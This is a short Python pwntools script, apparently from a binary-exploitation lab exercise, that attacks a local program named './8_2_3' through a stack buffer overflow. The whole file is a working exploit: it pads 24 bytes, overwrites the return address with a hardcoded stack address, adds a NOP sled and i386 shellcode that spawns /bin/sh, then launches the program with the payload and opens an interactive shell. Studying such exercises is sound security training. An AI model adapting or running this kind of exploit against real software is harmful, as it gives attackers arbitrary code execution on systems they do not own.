#!/usr/bin/env python
from pwn import *

context(arch = 'i386', os = 'linux')
path = './8_2_3'

ret_addr = 0xbfffeefc       # ebp = 0xbfffeee4 + 0x14 = 0xbfffeef8
shell_code = shellcraft.i386.sh()

payload  = b"A" * 24
payload += p32(ret_addr)
payload += b"\x90" * 20
payload += asm(shell_code)
payload += b"C" * 169       # 261 = 24 + 4 + 20 + 44 + 169

io=process(argv=[path,payload])
io.interactive()
